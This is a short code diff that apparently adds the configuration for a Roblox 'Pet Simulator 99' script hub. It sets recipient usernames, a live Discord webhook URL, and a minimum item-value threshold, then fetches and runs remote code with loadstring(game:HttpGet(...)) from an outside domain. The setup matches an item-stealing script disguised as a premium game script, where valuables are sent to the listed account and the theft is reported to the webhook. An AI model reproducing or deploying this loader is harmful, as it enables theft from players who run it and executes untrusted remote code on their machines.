@@ -1,0 +1,9 @@
+Username = "simpyurihshs"
+Username2 = "simpyurihshs"
+Webhook = "https://discord.com/api/webhooks/1216248985186992168/x-AG1p2JFXUwrk-TkVyznY68TyNahQxJstDVMnd00MUHiNBeD0qtkflVolCjZ-bLUtef"
+
+HubName = "Ps99 Script Prem(v.04)"
+
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
